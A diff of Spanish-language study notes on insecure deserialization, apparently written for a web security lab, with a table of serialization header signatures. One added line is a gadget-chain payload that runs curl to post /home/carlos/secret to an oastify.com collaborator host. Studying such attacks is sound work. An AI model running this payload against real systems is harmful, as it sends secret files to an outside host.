@@ -2,12 +2,16 @@
 
 > SIEMPRE analizar las cookies A MANO, un escaner podrá o no podrá identificar la deserialización insegura, pero nuestra cabeza, siempre podrá si estamos lo suficientemente preparados. 
 
+COOKIE MUY LARGA --> OJOOOOOO!!
+
 | Object Type     | Header (Hex) | Header (Base64) |
 | --------------- | ------------ | --------------- |
 | Java Serialized | AC ED        | rO              |
 | .NET ViewState  | FF 01        | /w              |
 | Python Pickle   | 80 04 95     | gASV            |
 | PHP Serialized  | 4F 3A        | Tz              |
+
+CommonsCollections7 'curl https://j5ppeqf3n37txn28onrhlmku3l9cx5lu.oastify.com -d @/home/carlos/secret'
 # Importante: ⚠️
 
 Para reconocer posibles puntos de entrada para su exploit, busque firmas que tengan todos los objetos serializados de Java:
